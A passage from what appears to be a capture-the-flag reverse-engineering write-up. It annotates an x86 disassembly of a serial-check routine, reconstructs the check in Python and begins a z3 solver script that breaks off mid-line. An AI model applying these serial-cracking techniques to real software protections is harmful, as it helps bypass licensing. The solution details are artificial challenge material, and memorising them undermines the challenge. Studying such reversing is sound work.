class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A06F</span>	    <span class="keyword">call</span> <span class="number">0x40A4B5</span></span><br><span class="line"><span class="number">0x0040A4B5</span>      <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line"><span class="number">0x0040A4B6</span>      <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="number">0x0040A4B8</span>      <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">38h</span></span><br><span class="line"><span class="number">0x0040A4BB</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="built_in">ecx</span></span><br><span class="line"><span class="number">0x0040A4BE</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line"><span class="number">0x0040A4C1</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span>+<span class="number">24h</span>]</span><br><span class="line"><span class="number">0x0040A4C4</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A4C7</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line"><span class="number">0x0040A4CA</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span>+<span class="number">28h</span>]</span><br><span class="line"><span class="number">0x0040A4CD</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">14h</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A4D0</span>      <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>], <span class="number">0</span></span><br><span class="line"><span class="number">0x0040A4D7</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line"><span class="number">0x0040A4DA</span>	    <span class="keyword">call</span> <span class="number">0x40A479</span></span><br><span class="line"><span class="number">0x0040A479</span>      <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line"><span class="number">0x0040A47A</span>      <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="number">0x0040A47C</span>      <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">10h</span></span><br><span class="line"><span class="number">0x0040A47F</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">8</span>], <span class="built_in">ecx</span></span><br><span class="line"><span class="number">0x0040A482</span>      <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">1</span>], <span class="number">90h</span></span><br><span class="line"><span class="number">0x0040A486</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A489</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span>+<span class="number">24h</span>]</span><br><span class="line"><span class="number">0x0040A48C</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A48F</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ecx</span>+<span class="number">28h</span>]</span><br><span class="line"><span class="number">0x0040A492</span>      <span class="keyword">lea</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span>+<span class="built_in">ecx</span>-<span class="number">1</span>]</span><br><span class="line"><span class="number">0x0040A496</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A499</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">10h</span>]</span><br><span class="line"><span class="number">0x0040A49C</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A49F</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">0Ch</span>]</span><br><span class="line"><span class="number">0x0040A4A2</span>      <span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">eax</span>]</span><br><span class="line"><span class="number">0x0040A4A4</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">2</span>], <span class="built_in">al</span></span><br><span class="line"><span class="number">0x0040A4A7</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">0Ch</span>]</span><br><span class="line"><span class="number">0x0040A4AA</span>      <span class="keyword">mov</span> <span class="built_in">cl</span>, [<span class="built_in">ebp</span>-<span class="number">1</span>]</span><br><span class="line"><span class="number">0x0040A4AD</span>      <span class="keyword">mov</span> [<span class="built_in">eax</span>], <span class="built_in">cl</span></span><br><span class="line"><span class="number">0x0040A4AF</span>      <span class="keyword">movzx</span> <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">2</span>]</span><br><span class="line"><span class="number">0x0040A4B3</span>      <span class="keyword">leave</span></span><br><span class="line"><span class="number">0x0040A4B4</span>      <span class="keyword">retn</span></span><br><span class="line"><span class="number">0x0040A4DF</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">38h</span>], <span class="built_in">al</span></span><br><span class="line"><span class="number">0x0040A4E2</span>      <span class="keyword">call</span> sub_40113E <span class="comment">; hash funcs</span></span><br><span class="line"><span class="number">0x0040A4E7</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A4EA</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line"><span class="number">0x0040A4ED</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span>]</span><br><span class="line"><span class="number">0x0040A4EF</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A4F2</span>      <span class="keyword">lea</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A4F5</span>      <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A4F6</span>      <span class="keyword">push</span> <span class="number">0</span></span><br><span class="line"><span class="number">0x0040A4F8</span>      <span class="keyword">push</span> <span class="number">0</span></span><br><span class="line"><span class="number">0x0040A4FA</span>      <span class="keyword">push</span> <span class="number">800Ch</span></span><br><span class="line"><span class="number">0x0040A4FF</span>      <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>]</span><br><span class="line"><span class="number">0x0040A502</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">10h</span>]</span><br><span class="line"><span class="number">0x0040A505</span>      <span class="keyword">call</span> sub_401022</span><br><span class="line"><span class="number">0x0040A50A</span>      <span class="keyword">test</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A513</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">20h</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A516</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A519</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">1Ch</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A51C</span>      <span class="keyword">push</span> <span class="number">0</span></span><br><span class="line"><span class="number">0x0040A51E</span>      <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">14h</span>]</span><br><span class="line"><span class="number">0x0040A521</span>      <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>]</span><br><span class="line"><span class="number">0x0040A524</span>      <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">1Ch</span>]</span><br><span class="line"><span class="number">0x0040A527</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">20h</span>]</span><br><span class="line"><span class="number">0x0040A52A</span>      <span class="keyword">call</span> sub_40108E</span><br><span class="line"><span class="number">0x0040A52F</span>      <span class="keyword">test</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A533</span>      <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">24h</span>], <span class="number">20h</span> <span class="comment">; &#x27; &#x27;</span></span><br><span class="line"><span class="number">0x0040A53A</span>      <span class="keyword">call</span> sub_40113E</span><br><span class="line"><span class="number">0x0040A53F</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">2Ch</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A542</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A545</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">28h</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A548</span>      <span class="keyword">push</span> <span class="number">0</span></span><br><span class="line"><span class="number">0x0040A54A</span>      <span class="keyword">lea</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">24h</span>]</span><br><span class="line"><span class="number">0x0040A54D</span>      <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A54E</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line"><span class="number">0x0040A551</span>      <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="number">4</span></span><br><span class="line"><span class="number">0x0040A554</span>      <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A555</span>      <span class="keyword">push</span> <span class="number">2</span></span><br><span class="line"><span class="number">0x0040A557</span>      <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">28h</span>]</span><br><span class="line"><span class="number">0x0040A55A</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">2Ch</span>]</span><br><span class="line"><span class="number">0x0040A55D</span>      <span class="keyword">call</span> sub_40107C</span><br><span class="line"><span class="number">0x0040A562</span>      <span class="keyword">nop</span></span><br><span class="line"><span class="number">0x0040A563</span>      <span class="keyword">call</span> sub_40113E</span><br><span class="line"><span class="number">0x0040A568</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">34h</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A56B</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A56E</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">30h</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A571</span>      <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">30h</span>]</span><br><span class="line"><span class="number">0x0040A574</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">34h</span>]</span><br><span class="line"><span class="number">0x0040A577</span>      <span class="keyword">call</span> sub_401058</span><br><span class="line"><span class="number">0x0040A57C</span>      <span class="keyword">nop</span></span><br><span class="line"><span class="number">0x0040A57D</span>      <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">38h</span>]</span><br><span class="line"><span class="number">0x0040A580</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line"><span class="number">0x0040A583</span>      <span class="keyword">call</span> <span class="number">0x40A58B</span></span><br><span class="line"><span class="number">0x0040A58B</span>      <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line"><span class="number">0x0040A58C</span>      <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="number">0x0040A58E</span>      <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">0Ch</span></span><br><span class="line"><span class="number">0x0040A591</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="built_in">ecx</span></span><br><span class="line"><span class="number">0x0040A594</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line"><span class="number">0x0040A597</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span>+<span class="number">24h</span>]</span><br><span class="line"><span class="number">0x0040A59A</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line"><span class="number">0x0040A59D</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ecx</span>+<span class="number">28h</span>]</span><br><span class="line"><span class="number">0x0040A5A0</span>      <span class="keyword">lea</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span>+<span class="built_in">ecx</span>-<span class="number">1</span>]</span><br><span class="line"><span class="number">0x0040A5A4</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A5A7</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A5AA</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A5AD</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">0Ch</span>]</span><br><span class="line"><span class="number">0x0040A5B0</span>      <span class="keyword">mov</span> <span class="built_in">cl</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A5B3</span>      <span class="keyword">mov</span> [<span class="built_in">eax</span>], <span class="built_in">cl</span></span><br><span class="line"><span class="number">0x0040A5B5</span>      <span class="keyword">leave</span></span><br><span class="line"><span class="number">0x0040A5B6</span>      <span class="keyword">retn</span> <span class="number">4</span></span><br><span class="line"><span class="number">0x0040A588</span>      <span class="keyword">nop</span></span><br><span class="line"><span class="number">0x0040A589</span>      <span class="keyword">leave</span></span><br><span class="line"><span class="number">0x0040A58A</span>      <span class="keyword">retn</span></span><br><span class="line"><span class="number">0x0040A107</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A109</span>      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="number">0x0040A07C</span>      <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="number">0</span></span><br><span class="line"><span class="number">0x0040A096</span>      <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="number">1</span></span><br><span class="line"><span class="number">0x0040A0A4</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A0A7</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br></pre></td></tr></table></figure>

<p>These codes are mainly used for hash verification and their existence can be ignored. And for every 4 byte after calculating:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0040A124</span>      <span class="keyword">cdq</span></span><br><span class="line"><span class="number">0x0040A125</span>      <span class="keyword">and</span> <span class="built_in">edx</span>, <span class="number">3</span> <span class="comment">; index &amp; 3</span></span><br><span class="line"><span class="number">0x0040A128</span>      <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="number">0x0040A12A</span>      <span class="keyword">sar</span> <span class="built_in">eax</span>, <span class="number">2</span></span><br><span class="line"><span class="number">0x0040A12D</span>      <span class="keyword">dec</span> <span class="built_in">eax</span> <span class="comment">; index//4 - 1</span></span><br><span class="line"><span class="number">0x0040A12E</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A131</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">18h</span>]</span><br><span class="line"><span class="number">0x0040A134</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">14h</span>]</span><br><span class="line"><span class="number">0x0040A137</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ecx</span>+<span class="built_in">eax</span>*<span class="number">4</span>] <span class="comment">; take the 5 dwords 0x40A000 loaded</span></span><br><span class="line"><span class="number">0x0040A13A</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">1Ch</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A13D</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line"><span class="number">0x0040A142</span>      <span class="keyword">inc</span> <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A146</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">0Ch</span>]</span><br><span class="line"><span class="number">0x0040A149</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">1Ch</span>] <span class="comment">; xor with cipher[index]</span></span><br><span class="line"><span class="number">0x0040A14C</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">10h</span>]</span><br><span class="line"><span class="number">0x0040A14F</span>      <span class="keyword">or</span> <span class="built_in">ecx</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A151</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>], <span class="built_in">ecx</span> <span class="comment">; accumulate bit difference</span></span><br><span class="line"><span class="number">0x0040A154</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A156</span>      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">48h</span> <span class="comment">; &#x27;H&#x27;</span></span><br><span class="line"><span class="number">0x0040A15C</span>      <span class="keyword">imul</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>], <span class="number">112233h</span></span><br><span class="line"><span class="number">0x0040A163</span>      <span class="keyword">sub</span> <span class="built_in">eax</span>, <span class="number">35014542h</span> <span class="comment">; change state to i*0x112233-0x35014542, infact 0xCAFEBABE is -0x35014542</span></span><br><span class="line"><span class="number">0x0040A168</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A16B</span>      <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="number">1</span></span><br><span class="line"><span class="number">0x0040A06D</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">eax</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>Therefore the encrypt process is:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sn = <span class="built_in">bytearray</span>(<span class="string">b&quot;1234567890123456789&quot;</span>)</span><br><span class="line">cip = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(sn), <span class="number">4</span>):</span><br><span class="line">    inp = sn[l:l+<span class="number">4</span>]</span><br><span class="line">    state = (l * <span class="number">0x112233</span> - <span class="number">0x35014542</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inp)): state = byte_func(inp[i], state)</span><br><span class="line">    cip.append(state)</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0x865DBB47</span>, <span class="number">0x0A6EB190</span>, <span class="number">0x20476C33</span>, <span class="number">0x1C8A7693</span>, <span class="number">0x59FEBDFB</span>]</span><br><span class="line"><span class="keyword">assert</span> cip == enc</span><br></pre></td></tr></table></figure>

<p>For each dword:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BV32 = <span class="keyword">lambda</span> x: BitVecVal(x &amp; <span class="number">0xFFFFFFFF</span>, <span class="number">32</span>)</span><br><span class="line">BV8  = <span class="keyword">lambda</span> x: BitVecVal(x &amp; <span class="number">0xFF</span>, <span class="number">8</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zext8_to_32</span>(<span class="params">b8</span>): <span class="keyword">return</span> ZeroExt(<span class="number">24</span>, b8)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol32</span>(<span class="params">x, sh</span>): <span class="keyword">return</span> RotateLeft(x, sh)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror32</span>(<span class="params">x, sh</span>): <span class="keyword">return</span> RotateRight(x, sh)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ULT32</span>(<span class="params">a, b</span>): <span class="keyword">return</span> ULT(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ULE32</span>(<span class="params">a, b</span>): <span class="keyword">return</span> ULE(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">UGT32</span>(<span class="params">a, b</span>): <span class="keyword">return</span> UGT(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">UGE32</span>(<span class="params">a, b</span>): <span class="keyword">return</span> UGE(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ULT8</span>(<span class="params">a, b</span>): <span class="keyword">return</span> ULT(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ULE8</span>(<span class="params">a, b</span>): <span class="keyword">return</span> ULE(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">UGT8</span>(<span class="params">a, b</span>): <span class="keyword">return</span> UGT(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">UGE8</span>(<span class="params">a, b</span>): <span class="keyword">return</span> UGE(a, b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">switch_case</span>(<span class="params">inp8, state32</span>):</span><br><span class="line">    inp32 = zext8_to_32(inp8)</span><br><span class="line">    c_state_lsb0 = (state32 &amp; BV32(<span class="number">1</span>)) == BV32(<span class="number">0</span>)</span><br><span class="line">    c_inp_lt_40 = ULT8(inp8, BV8(<span class="number">0x40</span>))</span><br><span class="line">    c_inp_bit1_0 = ((inp8 &amp; BV8(<span class="number">2</span>)) == BV8(<span class="number">0</span>))</span><br><span class="line">    s1 = (state32 - (inp32 &lt;&lt; <span class="number">4</span>)) &amp; BV32(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    s1 = If(inp8 == BV8(<span class="number">0x30</span>), s1 | BV32(<span class="number">0xF0F0F0F0</span>), s1)</span><br><span class="line">    s2 = ((state32 ^ BV32(<span class="number">0x55AA55AA</span>)) + inp32) &amp; BV32(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    c_inp_even = ((inp8 &amp; BV8(<span class="number">1</span>)) == BV8(<span class="number">0</span>))</span><br><span class="line">    s3 = (rol32(state32, <span class="number">3</span>) + BV32(<span class="number">0x12345678</span>)) &amp; BV32(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    s4 = (ror32(state32, <span class="number">5</span>) ^ BV32(<span class="number">0x87654321</span>)) &amp; BV32(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    branch_state0 = If(c_inp_lt_40, If(c_inp_bit1_0, s1, s2), If(c_inp_even, s3, s4))</span><br><span class="line">    c_topbit_same = (((state32 ^ inp32) &amp; BV32(<span class="number">0x80000000</span>)) == BV32(<span class="number">0</span>))</span><br><span class="line">    s5 = (state32 - inp32) &amp; BV32(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    s6 = (state32 + inp32) &amp; BV32(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    s6 = If((s6 &amp; BV32(<span class="number">0x100</span>)) == BV32(<span class="number">0x100</span>), s6 ^ BV32(<span class="number">0x13371337</span>), s6)</span><br><span class="line">    s7 = (state32 * BV32(<span class="number">9</span>)) &amp; BV32(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    branch_topbit0 = If(And(UGE8(inp8, BV8(<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>))), ULE8(inp8, BV8(<span class="built_in">ord</span>(<span class="string">&quot;z&quot;</span>)))), s5, If(And(UGE8(inp8, BV8(<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>))), ULE8(inp8, BV8(<span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>)))), s6, s7))</span><br><span class="line">    s8 = (state32 - BV32(<span class="number">0x21524111</span>)) &amp; BV32(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    s8 = If(UGE8(inp8, BV8(<span class="number">0x60</span>)), s8 ^ ((inp32 * BV32(<span class="number">0x21</span>)) &amp; BV32(<span class="number">0xFFFFFFFF</span>)), 